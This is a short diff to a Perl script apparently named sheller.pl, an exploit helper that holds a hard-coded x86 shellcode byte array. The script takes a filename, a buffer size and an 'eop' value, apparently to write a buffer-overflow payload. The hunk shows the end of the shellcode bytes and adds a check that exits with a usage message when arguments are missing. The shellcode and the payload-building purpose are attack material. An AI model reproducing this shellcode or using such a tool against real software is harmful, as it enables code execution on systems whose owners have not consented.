@@ -15,7 +15,11 @@ my @shellcode = ("\x31", "\xc0", "\x31", "\xdb", "\x31", "\xc9",
 		 "\x80", "\x83", "\xc4", "\x01", "\xeb", "\xdf", 
 		 "\xe8", "\xc9", "\xff", "\xff", "\xff");
 
-print "Usage: ./sheller.pl [filename] [buffersize] [eop]\n";
+unless( $ARGV[0] && $ARGV[1] && $ARGV[2]) {
+    print "Usage: ./sheller.pl [filename] [buffersize] [eop]\n";
+    exit
+}
+
 my $filename =  $ARGV[0];
 my $buffersize = $ARGV[1];
 my $eop = $ARGV[2];
